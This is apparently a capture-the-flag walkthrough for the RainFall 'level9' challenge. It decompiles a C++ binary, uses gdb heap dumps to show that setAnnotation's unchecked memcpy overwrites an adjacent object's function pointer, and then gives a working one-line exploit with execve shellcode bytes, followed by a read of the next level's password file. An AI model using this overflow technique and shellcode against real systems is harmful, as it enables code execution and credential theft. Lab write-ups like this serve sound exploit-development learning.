## Step 1: Static & Dynamic Analysis

```c
PTR_operator+_08048848                          XREF[1]:     N:080486fc(*)  
        08048848 3a 87 04 08     addr       N::operator+
        0804884c 4e 87 04 08     addr       N::operator-


void __thiscall N::setAnnotation(N *this,char *param_1)
{
  size_t __n;
  
  __n = strlen(param_1);
  memcpy(this + 4,param_1,__n);
  return;
}

void __thiscall N::N(N *this,int param_1)
{
  *(undefined ***)this = &PTR_operator+_08048848;
  *(int *)(this + 0x68) = param_1;
  return;
}

void main(int param_1,int param_2)
{
  N *this;
  undefined4 *this_00;
  
  if (param_1 < 2) {
    _exit(1);
  }
  this = (N *)operator.new(0x6c);
  N::N(this,5);
  this_00 = (undefined4 *)operator.new(0x6c);
  N::N((N *)this_00,6);
  N::setAnnotation(this,*(char **)(param_2 + 4));
  (**(code **)*this_00)(this_00,this);
  return;
}
```

### Explanation
The binary creates two structures, `this` and `this_00`, and allocates them on the heap, each with a size of `108 bytes`. The first `4 bytes` of each structure store a pointer to a function, and the last `4 bytes` store a value (`5` and `6`). The `setAnnotation()` function copies the content of `argv[1]` into the remaining `100 bytes` of the `this` structure. However, this function does not perform any checks for potential `buffer overflows`.
In the final part of the binary, the function pointer stored in `this_00` is dereferenced to execute an operation involving the values stored in `this` and `this_00`.

```asm
(gdb) info proc map                                                                                                                           
process 3525                                                                                                                                  
Mapped address spaces:                                                                                                                        
                                                                                                                                              
        Start Addr   End Addr       Size     Offset objfile                                                                                   
         0x8048000  0x8049000     0x1000        0x0 /home/user/level9/level9                                                                  
         0x8049000  0x804a000     0x1000        0x0 /home/user/level9/level9                                                                  
         0x804a000  0x806b000    0x21000        0x0 [heap]                                                                                    
        0xb7cfa000 0xb7cfc000     0x2000        0x0                                                                                           
        0xb7cfc000 0xb7d18000    0x1c000        0x0 /lib/i386-linux-gnu/libgcc_s.so.1                                                         
        0xb7d18000 0xb7d19000     0x1000    0x1b000 /lib/i386-linux-gnu/libgcc_s.so.1                                                         
        0xb7d19000 0xb7d1a000     0x1000    0x1c000 /lib/i386-linux-gnu/libgcc_s.so.1                                                         
        0xb7d1a000 0xb7d44000    0x2a000        0x0 /lib/i386-linux-gnu/libm-2.15.so                                                          
        0xb7d44000 0xb7d45000     0x1000    0x29000 /lib/i386-linux-gnu/libm-2.15.so                                                          
        0xb7d45000 0xb7d46000     0x1000    0x2a000 /lib/i386-linux-gnu/libm-2.15.so                                                          
        0xb7d46000 0xb7d47000     0x1000        0x0                                                                                           
        0xb7d47000 0xb7eea000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so                                                          
        0xb7eea000 0xb7eec000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so                                                          
        0xb7eec000 0xb7eed000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so                                                          
        0xb7eed000 0xb7ef0000     0x3000        0x0                                                                                           
        0xb7ef0000 0xb7fc8000    0xd8000        0x0 /usr/lib/i386-linux-gnu/libstdc++.so.6.0.16                                               
        0xb7fc8000 0xb7fc9000     0x1000    0xd8000 /usr/lib/i386-linux-gnu/libstdc++.so.6.0.16                                               
        0xb7fc9000 0xb7fcd000     0x4000    0xd8000 /usr/lib/i386-linux-gnu/libstdc++.so.6.0.16                                               
        0xb7fcd000 0xb7fce000     0x1000    0xdc000 /usr/lib/i386-linux-gnu/libstdc++.so.6.0.16                                               
        0xb7fce000 0xb7fd5000     0x7000        0x0                                                                                           
        0xb7fdb000 0xb7fdd000     0x2000        0x0 
        0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]
        0xb7fde000 0xb7ffe000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.15.so
        0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.15.so
        0xb7fff000 0xb8000000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.15.so
        0xbffdf000 0xc0000000    0x21000        0x0 [stack]
```

```gdb
run "$(python -c 'print("A" * 100)')"
```

```asm
(gdb) x/64wx 0x804a000
0x804a000:      0x00000000      0x00000071      0x08048848      0x41414141
0x804a010:      0x41414141      0x41414141      0x41414141      0x41414141
0x804a020:      0x41414141      0x41414141      0x41414141      0x41414141
0x804a030:      0x41414141      0x41414141      0x41414141      0x41414141
0x804a040:      0x41414141      0x41414141      0x41414141      0x41414141
0x804a050:      0x41414141      0x41414141      0x41414141      0x41414141
0x804a060:      0x41414141      0x41414141      0x41414141      0x41414141
0x804a070:      0x00000005      0x00000071      0x08048848      0x00000000
0x804a080:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a090:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a0a0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a0b0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a0c0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a0d0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a0e0:      0x00000006      0x00020f21      0x00000000      0x00000000
0x804a0f0:      0x00000000      0x00000000      0x00000000      0x00000000
```
The heap layout reveals that the two structures are allocated consecutively in memory. Providing input larger than `100 bytes` will result in writing beyond the bounds of this, allowing us to modify the content of `this_00`. This includes overwriting the function pointer stored in the first `4 bytes` of `this_00`.

The program dereferences the function pointer stored in `this_00`, expecting it to point to a valid function. However, instead of directly pointing the overwritten function pointer to the [shellcode](https://shell-storm.org/shellcode/files/shellcode-811.html) or a specific function, we make it point to an intermediary address (`0x0804a07c`). This intermediary address, in turn, holds the actual address of the shellcode (`0x0804a080`).

This two-level indirection is required because the program dereferences the function pointer once before calling it. If the function pointer in `this_00` were overwritten to directly point to the shellcode, the program would attempt to dereference the shellcode itself, leading to a crash.


## Step 2: Exploiting the Binary
```bash
level9@RainFall:~$ ./level9 $(python -c 'print(("A" * 108) + "\x08\x04\xa0\x7c"[::-1] + "\x08\x04\xa0\x80"[::-1] + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80")')
```

```bash
% cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```
